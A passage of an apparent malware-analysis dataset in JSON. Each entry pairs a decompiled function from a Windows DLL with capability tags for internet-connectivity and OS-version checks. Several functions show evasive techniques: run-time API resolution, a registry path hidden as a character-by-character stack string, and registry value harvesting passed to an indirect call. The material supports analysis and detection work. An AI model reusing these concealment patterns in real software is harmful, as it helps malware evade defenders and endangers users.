            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001dcd0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    puVar1 = fcn.1800012d0(4, arg2);\n    if (puVar1 != NULL) {\n        puVar2 = fcn.18000eb30(arg3);\n        *puVar1 = *puVar2;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "18001dd7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001dd70(int64_t arg1, uint64_t arg2, int64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t in_stack_00000028;\n    uint64_t uStack32;\n    \n    if ((*(arg1 + 0x10) < arg2) || (uVar2 = fcn.1800020f0(arg3),  uVar2 < arg4)) {\n        fcn.1800027f0(arg1);\n    }\n    iVar3 = fcn.1800020f0(arg3);\n    if (iVar3 - arg4 < in_stack_00000028) {\n        in_stack_00000028 = iVar3 - arg4;\n    }\n    if (-*(arg1 + 0x10) - 1U <= in_stack_00000028) {\n        fcn.18000c240(arg1);\n    }\n    if (in_stack_00000028 != 0) {\n        iVar3 = *(arg1 + 0x10) + in_stack_00000028;\n        cVar1 = fcn.1800029c0(arg1, iVar3);\n        if (cVar1 != '\\0') {\n            iVar6 = *(arg1 + 0x10);\n            iVar4 = fcn.1800027b0(arg1);\n            iVar5 = fcn.1800027b0(arg1);\n            fcn.180001500(iVar5 + arg2 * 2 + in_stack_00000028 * 2, iVar4 + arg2 * 2, iVar6 - arg2);\n            if (arg1 == arg3) {\n                uStack32 = arg4;\n                if (arg2 < arg4) {\n                    uStack32 = arg4 + in_stack_00000028;\n                }\n                iVar6 = fcn.1800027b0(arg1);\n                iVar4 = fcn.1800027b0(arg1);\n                fcn.180001500(iVar4 + arg2 * 2, iVar6 + uStack32 * 2, in_stack_00000028);\n            }\n            else {\n                iVar6 = fcn.1800027b0(arg3);\n                iVar4 = fcn.1800027b0(arg1);\n                fcn.1800014a0(iVar4 + arg2 * 2, iVar6 + arg4 * 2, in_stack_00000028);\n            }\n            fcn.1800026c0(arg1, iVar3);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 596
    },
    "18001df9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001df90(int64_t arg1, uint64_t arg2, int64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    cVar1 = fcn.180002d90(arg1, arg3);\n    if (cVar1 == '\\0') {\n        if (*(arg1 + 0x10) < arg2) {\n            fcn.1800027f0(arg1);\n        }\n        if (-*(arg1 + 0x10) - 1U <= arg4) {\n            fcn.18000c240(arg1);\n        }\n        if (arg4 != 0) {\n            iVar2 = *(arg1 + 0x10) + arg4;\n            cVar1 = fcn.1800029c0(arg1, iVar2);\n            if (cVar1 != '\\0') {\n                iVar5 = *(arg1 + 0x10);\n                iVar3 = fcn.1800027b0(arg1);\n                iVar4 = fcn.1800027b0(arg1);\n                fcn.180001500(iVar4 + arg2 * 2 + arg4 * 2, iVar3 + arg2 * 2, iVar5 - arg2);\n                iVar5 = fcn.1800027b0(arg1);\n                fcn.1800014a0(iVar5 + arg2 * 2, arg3, arg4);\n                fcn.1800026c0(arg1, iVar2);\n            }\n        }\n    }\n    else {\n        iVar2 = fcn.1800027b0(arg1);\n        arg1 = fcn.18001dd70(arg1, arg2, arg1, arg3 - iVar2 >> 1);\n    }\n    return arg1;\n}\n",
        "token_count": 418
    },
    "18001e12": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001e120(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    \n    puVar1 = fcn.1800012d0(8, arg2);\n    if (puVar1 != NULL) {\n        puVar2 = fcn.18000eb30(arg3);\n        *puVar1 = *puVar2;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "18001e2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001e2f0(ulong arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    \n    puVar1 = fcn.1800012d0(8, arg1);\n    if (puVar1 != NULL) {\n        puVar2 = fcn.18000eb30(arg2);\n        *puVar1 = *puVar2;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "18001e47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001e470(ulong arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    int64_t arg1_01;\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iStack56;\n    \n    arg1_00 = fcn.1800319cc(arg2);\n    arg1_01 = fcn.1800319cc(arg1);\n    if ((arg1_00 == 0) || (arg1_01 == 0)) {\n        if (arg1_00 != 0) {\n            fcn.180024024(arg1_00);\n        }\n        if (arg1_01 != 0) {\n            fcn.180024024(arg1_01);\n        }\n        iVar2 = 0;\n    }\n    else {\n        fcn.18001e430(arg1_00);\n        fcn.18001e430(arg1_01);\n        iStack56 = 0;\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(arg1_01);\n            if (iVar1 == 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(100);\n            }\n            iStack56 = iStack56 + 1;\n        } while ((iVar1 == 0) && (iStack56 < 4));\n        if (iVar1 == 0) {\n            fcn.18001e420();\n        }\n        iStack56 = 0;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, arg1_00);\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(100);\n            }\n            iStack56 = iStack56 + 1;\n        } while ((iVar2 == 0) && (iStack56 < 4));\n        if (iVar2 == 0) {\n            fcn.18001e420();\n        }\n        if (arg1_00 != 0) {\n            fcn.180024024(arg1_00);\n        }\n        if (arg1_01 != 0) {\n            fcn.180024024(arg1_01);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 488
    },
    "18001e5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001e5f0(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piStack24;\n    int64_t *piStack16;\n    \n    piStack24 = 0x180041810;\n    do {\n        if (*piStack24 == 0) {\n            fcn.18001e420();\n            return 0;\n        }\n        for (piStack16 = piStack24 + 1; *piStack16 != 0; piStack16 = piStack16 + 2) {\n            iVar1 = fcn.180024374(*piStack16, arg1);\n            if (iVar1 == 0) {\n                if (piStack16[1] == 0) {\n                    iVar2 = fcn.18001e470(*piStack24, *piStack16);\n                    piStack16[1] = iVar2;\n                }\n                return piStack16[1];\n            }\n        }\n        piStack24 = piStack24 + 0x201;\n    } while( true );\n}\n",
        "token_count": 237
    },
    "18001ecb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001ecb0(int64_t arg1)\n\n{\n    code *pcVar1;\n    uchar auStack120 [32];\n    int32_t iStack88;\n    ulong auStack80 [2];\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack48;\n    ushort uStack46;\n    ushort uStack44;\n    ulong uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack120;\n    fcn.180001e30(arg1);\n    uStack64 = 0x2e;\n    uStack62 = 0x73;\n    uStack60 = 0x62;\n    uStack58 = 0x72;\n    uStack56 = 0x5c;\n    uStack54 = 0x4f;\n    uStack52 = 0x72;\n    uStack50 = 100;\n    uStack48 = 0x65;\n    uStack46 = 0x72;\n    uStack44 = 0;\n    fcn.180001f50(arg1, &uStack64);\n    *(arg1 + 0x28) = 0;\n    iStack88 = 0;\n    auStack80[0] = 0;\n    uStack32 = fcn.1800020d0(arg1);\n    pcVar1 = fcn.18001e5f0(0x1800387a8);\n    iStack88 = (*pcVar1)(0xffffffff80000000, uStack32, auStack80);\n    if (iStack88 == 0) {\n        pcVar1 = fcn.18001e5f0(0x1800387c8);\n        (*pcVar1)(auStack80[0]);\n        fcn.18001ee10(arg1);\n    }\n    else {\n        pcVar1 = fcn.18001e5f0(0x1800387b8);\n        (*pcVar1)(auStack80[0]);\n    }\n    fcn.180023980(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 512
    },
    "18001efd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001efd0(ulong arg1, int64_t arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    ulong uVar5;\n    int16_t **arg2_00;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int32_t *arg2_01;\n    uchar *puVar8;\n    int16_t *piVar9;\n    uchar auStack312 [40];\n    uchar auStack272 [40];\n    uchar auStack232 [48];\n    int32_t iStack184;\n    uchar uStack180;\n    uchar auStack176 [40];\n    uint32_t uStack136;\n    uchar auStack132 [44];\n    int16_t **ppiStack88;\n    int32_t iStack80;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    ulong uStack64;\n    uint32_t uStack56;\n    ulong uStack48;\n    int16_t **ppiStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack312;\n    if (*(arg2 + 4) == 0) goto code_r0x00018001f3be;\n    uStack136 = 0;\n    puVar8 = auStack132;\n    for (iVar6 = 0x2c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    iVar6 = arg2;\n    iVar3 = fcn.18001e5f0(0x1800387e8);\n    if (iVar3 == 0) {\n        pcVar4 = fcn.18001e5f0(0x180038818);\n        (*pcVar4)(&uStack136);\n    }\n    else {\n        pcVar4 = fcn.18001e5f0(0x180038800);\n        (*pcVar4)(&uStack136);\n    }\n    uStack180 = 0;\n    fcn.180001e30(auStack272);\n    uStack56 = uStack136 & 0xffff;\n    if (uStack56 == 0) {\n        fcn.180001f50(auStack272, 0x18003886c);\n    }\n    else {\n        if ((uStack56 != 6) && (uStack56 != 9)) {\n            uStack74 = 0;\n            fcn.180001ef0(auStack272, iVar6);\n            goto code_r0x00018001f3be;\n        }\n        iVar3 = fcn.18001e5f0(0x180038828);\n        if (iVar3 == 0) {\n            uStack76 = 0;\n            fcn.180001ef0(auStack272, iVar6);\n            goto code_r0x00018001f3be;\n        }\n        iStack80 = 0;\n        pcVar4 = fcn.18001e5f0(0x180038848);\n        uStack48 = (*pcVar4)();\n        pcVar4 = fcn.18001e5f0(0x180038838);\n        arg2_01 = &iStack80;\n        iVar2 = (*pcVar4)(uStack48);\n        if (iVar2 == 0) {\n            uStack75 = 0;\n            fcn.180001ef0(auStack272, arg2_01);\n            goto code_r0x00018001f3be;\n        }\n        if (iStack80 == 0) {\n            fcn.180001f50(auStack272, 0x180038864);\n        }\n        else {\n            fcn.180001f50(auStack272, 0x18003885c);\n        }\n    }\n    fcn.180001e80(auStack176, *(arg2 + 4));\n    iStack184 = fcn.180023520(auStack176, 0x1800387c4, 0);\n    if (iStack184 == -1) {\n        fcn.1800234c0(auStack176, auStack272);\n        fcn.1800011f0(*(arg2 + 4), 0x4000);\n        uVar5 = fcn.1800020d0(auStack176);\n        fcn.180001590(*(arg2 + 4), 0x4000, uVar5);\n    }\n    else {\n        fcn.18001dc40(auStack176, iStack184, auStack272);\n        fcn.1800011f0(*(arg2 + 4), 0x4000);\n        uVar5 = fcn.1800020d0(auStack176);\n        fcn.180001590(*(arg2 + 4), 0x4000, uVar5);\n    }\n    fcn.180001000(auStack232, *(arg2 + 4));\n    arg2_00 = fcn.180001190(auStack232);\n    uVar7 = 0xffffffffffffffff;\n    piVar9 = *arg2_00;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        iVar1 = *piVar9;\n        piVar9 = piVar9 + 1;\n    } while (iVar1 != 0);\n    ppiStack88 = arg2_00;\n    if (1 < ~uVar7 - 1) {\n        arg2_00 = fcn.1800020d0(auStack272);\n        uStack32 = 0;\n        uVar7 = 0xffffffffffffffff;\n        piVar9 = *ppiStack88;\n        do {\n            if (uVar7 == 0) break;\n            uVar7 = uVar7 - 1;\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        ppiStack40 = arg2_00;\n        iVar2 = fcn.180031b40(*ppiStack88 + (~uVar7 - 3), arg2_00);\n        if (iVar2 == 0) {\n            uStack72 = 1;\n            fcn.180001120(auStack232);\n            fcn.180001ef0(auStack176, arg2_00);\n            fcn.180001ef0(auStack272, arg2_00);\n            goto code_r0x00018001f3be;\n        }\n    }\n    uStack73 = 0;\n    fcn.180001120(auStack232);\n    fcn.180001ef0(auStack176, arg2_00);\n    fcn.180001ef0(auStack272, arg2_00);\ncode_r0x00018001f3be:\n    fcn.180023980(uStack24 ^ auStack312);\n    return;\n}\n",
        "token_count": 1575
    },
    "1800206c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800206c0(ulong arg1, ulong arg2, int16_t *arg3)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong arg2_00;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar auStack264 [40];\n    uchar auStack224 [40];\n    uchar auStack184 [40];\n    int32_t iStack144;\n    ulong uStack136;\n    uchar auStack128 [8];\n    uchar auStack120 [40];\n    uchar *puStack80;\n    uchar uStack72;\n    uchar uStack71;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack264;\n    iStack144 = 0;\n    uStack136 = 0;\n    uStack56 = fcn.1800020d0(arg1);\n    pcVar2 = fcn.18001e5f0(0x180038898);\n    iStack144 = (*pcVar2)(0xffffffff80000000, uStack56);\n    if (iStack144 == 0) {\n        puVar5 = auStack184;\n        for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.180007a60(auStack128);\n        uVar4 = 0xffffffffffffffff;\n        piVar6 = arg3;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        fcn.180009740(auStack128, arg3, (~uVar4 - 1) * 2 & 0xffffffff, auStack184);\n        puStack80 = auStack120;\n        uStack48 = fcn.18000b740(puStack80, auStack184);\n        uStack40 = fcn.18000e140(auStack224, uStack48);\n        uStack32 = uStack40;\n        uStack24 = fcn.1800020d0(uStack40);\n        pcVar2 = fcn.18001e5f0(0x1800388a8);\n        arg2_00 = uStack24;\n        iStack144 = (*pcVar2)(uStack136);\n        fcn.180001ef0(auStack224, arg2_00);\n        if (iStack144 == 0) {\n            pcVar2 = fcn.18001e5f0(0x1800388b8);\n            (*pcVar2)(uStack136);\n            uStack71 = 1;\n            fcn.180007ac0(auStack128);\n        }\n        else {\n            uStack72 = 0;\n            fcn.180007ac0(auStack128);\n        }\n    }\n    fcn.180023980(uStack16 ^ auStack264);\n    return;\n}\n",
        "token_count": 747
    },
    "1800208c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800208c0(ulong arg1, ulong arg2, int16_t *arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar auStack344 [32];\n    uint *puStack312;\n    ulong uStack304;\n    uchar auStack288 [40];\n    uchar auStack248 [40];\n    uint32_t uStack208;\n    uchar auStack200 [8];\n    uchar auStack192 [56];\n    uint auStack136 [2];\n    ulong uStack128;\n    char cStack120;\n    uchar auStack112 [40];\n    uchar *puStack72;\n    uchar uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    uint32_t uStack24;\n    uchar uStack20;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack344;\n    uStack208 = 0;\n    puVar5 = auStack192;\n    for (iVar3 = 0x35; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack128 = 0;\n    auStack136[0] = 0;\n    puVar5 = auStack248;\n    for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.180007a60(auStack200);\n    uVar4 = 0xffffffffffffffff;\n    piVar6 = arg3;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    fcn.180009740(auStack200, arg3, (~uVar4 - 1) * 2 & 0xffffffff, auStack248);\n    puStack72 = auStack112;\n    uStack48 = fcn.18000b740(puStack72, auStack248);\n    uStack40 = fcn.18000e140(auStack288, uStack48);\n    uStack32 = uStack40;\n    arg2_00 = fcn.1800020d0(uStack40);\n    puStack312 = auStack136;\n    uStack304 = arg4;\n    cVar2 = fcn.180021210(arg1, arg2_00, auStack192, &uStack128);\n    cStack120 = cVar2 == '\\0';\n    uStack24 = cStack120;\n    fcn.180001ef0(auStack288, arg2_00);\n    uStack208 = cStack120 == '\\0';\n    fcn.180015b80(&uStack128);\n    uStack64 = uStack208 != 0;\n    uStack20 = uStack64;\n    fcn.180007ac0(auStack200);\n    fcn.180023980(uStack16 ^ auStack344);\n    return;\n}\n",
        "token_count": 767
    },
    "180020af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180020af0(ulong arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    code *pcVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uchar *puVar9;\n    int16_t *piVar10;\n    double dStackX24;\n    int64_t iStackX32;\n    ulong uStack16;\n    \n    uStack16 = 0x180020b0b;\n    iVar4 = fcn.1800303a0();\n    iVar4 = -iVar4;\n    *(&stack0x000044f0 + iVar4) = *0x180040248 ^ &stack0xfffffffffffffff8 + iVar4;\n    *(*(&stack0x00004508 + iVar4) + 0x30) = *(&stack0x00004518 + iVar4);\n    *(&stack0x0000003c + iVar4) = 0;\n    *(&stack0x00000040 + iVar4) = 0;\n    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020b54;\n    uVar5 = fcn.1800020d0(*(&stack0x00004508 + iVar4));\n    *(&stack0x000044e0 + iVar4) = uVar5;\n    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020b68;\n    pcVar6 = fcn.18001e5f0(0x1800388c8);\n    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020b81;\n    uVar3 = (*pcVar6)(0xffffffff80000000, *(&stack0x000044e0 + iVar4), &stack0x00000040 + iVar4);\n    *(&stack0x0000003c + iVar4) = uVar3;\n    if (*(&stack0x0000003c + iVar4) == 0) {\n        puVar9 = &stack0x000002b8 + iVar4;\n        for (iVar7 = 0x4000; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        puVar9 = &stack0x000042b8 + iVar4;\n        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        puVar9 = &stack0x00000068 + iVar4;\n        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *(&stack0x000002b0 + iVar4) = 0;\n        *(&stack0x00000038 + iVar4) = 0;\n        *(&stack0x000044d0 + iVar4) = 0;\n        *(&stack0x000044c8 + iVar4) = 0;\n        puVar9 = &stack0x00000278 + iVar4;\n        for (iVar7 = 0x35; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *(&stack0x000044d8 + iVar4) = 0;\n        while( true ) {\n            *(&stack0x000002b0 + iVar4) = 0x104;\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020c4c;\n            fcn.1800011f0(&stack0x00000068 + iVar4, 0x208);\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020c58;\n            pcVar6 = fcn.18001e5f0(0x1800388d8);\n            *(&stack0x00000030 + iVar4) = 0;\n            *(&stack0x00000028 + iVar4) = 0;\n            *(&stack0x00000020 + iVar4) = 0;\n            *(&stack0x00000018 + iVar4) = 0;\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020c97;\n            uVar3 = (*pcVar6)(*(&stack0x00000040 + iVar4), *(&stack0x000044d8 + iVar4), &stack0x00000068 + iVar4, \n                              &stack0x000002b0 + iVar4);\n            *(&stack0x0000003c + iVar4) = uVar3;\n            if (*(&stack0x0000003c + iVar4) != 0) break;\n            if (*(&stack0x000044d0 + iVar4) != 0) {\n                *(&stack0xfffffffffffffff0 + iVar4) = 0x180020cbf;\n                fcn.180015b80(&stack0x000044d0 + iVar4);\n            }\n            *(&stack0x000044c8 + iVar4) = 0;\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020cd6;\n            pcVar6 = fcn.18001e5f0(0x1800388e8);\n            *(&stack0x00000020 + iVar4) = &stack0x000044c8 + iVar4;\n            *(&stack0x00000018 + iVar4) = 0;\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020d00;\n            uVar3 = (*pcVar6)(*(&stack0x00000040 + iVar4), &stack0x00000068 + iVar4, 0, &stack0x00000038 + iVar4);\n            *(&stack0x0000003c + iVar4) = uVar3;\n            if ((*(&stack0x0000003c + iVar4) == 0) && (*(&stack0x000044c8 + iVar4) != 0)) {\n                *(&stack0xfffffffffffffff0 + iVar4) = 0x180020d2d;\n                uVar5 = fcn.180015b40(*(&stack0x000044c8 + iVar4));\n                *(&stack0x000044d0 + iVar4) = uVar5;\n                *(&stack0xfffffffffffffff0 + iVar4) = 0x180020d41;\n                pcVar6 = fcn.18001e5f0(0x180038910);\n                *(&stack0x00000020 + iVar4) = &stack0x000044c8 + iVar4;\n                *(&stack0x00000018 + iVar4) = *(&stack0x000044d0 + iVar4);\n                *(&stack0xfffffffffffffff0 + iVar4) = 0x180020d6f;\n                uVar3 = (*pcVar6)(*(&stack0x00000040 + iVar4), &stack0x00000068 + iVar4, 0, &stack0x00000038 + iVar4);\n                *(&stack0x0000003c + iVar4) = uVar3;\n                if ((*(&stack0x0000003c + iVar4) == 0) && (*(&stack0x000044c8 + iVar4) != 0)) {\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020da0;\n                    fcn.1800011f0(&stack0x00000278 + iVar4, 0x35);\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020dc0;\n                    fcn.180023f9c(&stack0x00000278 + iVar4, 0x35, *(&stack0x000044d0 + iVar4), 0x35);\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020dd2;\n                    fcn.1800011f0(&stack0x000042b8 + iVar4, 0x208);\n                    *(&stack0x00000018 + iVar4) = *(&stack0x00000278 + iVar4);\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020e02;\n                    fcn.180015f80(&stack0x000042b8 + iVar4, 0x208, L\"%s:%f:;\", &stack0x00000068 + iVar4);\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020e1c;\n                    fcn.180015ef0(&stack0x000002b8 + iVar4, 0x4000, &stack0x000042b8 + iVar4);\n                }\n            }\n            *(&stack0x000044d8 + iVar4) = *(&stack0x000044d8 + iVar4) + 1;\n        }\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x180020e2d;\n        pcVar6 = fcn.18001e5f0(0x180038948);\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x180020e34;\n        (*pcVar6)(*(&stack0x00000040 + iVar4));\n        puVar9 = &stack0x00000050 + iVar4;\n        for (iVar7 = 0xd; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        iVar7 = -1;\n        piVar10 = &stack0x000002b8 + iVar4;\n        do {\n            if (iVar7 == 0) break;\n            iVar7 = iVar7 + -1;\n            iVar1 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar1 != 0);\n        if (iVar7 == -2) {\n            *(&stack0x000044e8 + iVar4) = 0;\n        }\n        else {\n            uVar8 = 0xffffffffffffffff;\n            piVar10 = &stack0x000002b8 + iVar4;\n            do {\n                if (uVar8 == 0) break;\n                uVar8 = uVar8 - 1;\n                iVar1 = *piVar10;\n                piVar10 = piVar10 + 1;\n            } while (iVar1 != 0);\n            *(&stack0x000044e8 + iVar4) = ~uVar8 * 2;\n        }\n        *(&stack0x00000054 + iVar4) = *(&stack0x000044e8 + iVar4);\n        (&stack0x0000005c)[iVar4] = 0x65;\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x180020ece;\n        cVar2 = (**0x18004ac68)(*(&stack0x00004510 + iVar4), &stack0x00000050 + iVar4, 0xd);\n        if ((cVar2 != '\\0') && (*(&stack0x00000054 + iVar4) != 0)) {\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x180020efb;\n            (**0x18004ac68)(*(&stack0x00004510 + iVar4), &stack0x000002b8 + iVar4, *(&stack0x00000054 + iVar4));\n        }\n    }\n    *(&stack0xfffffffffffffff0 + iVar4) = 0x180020f18;\n    fcn.180023980(*(&stack0x000044f0 + iVar4) ^ &stack0xfffffffffffffff8 + iVar4);\n    return;\n}\n",
        "token_count": 2665
    },
    "180020f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
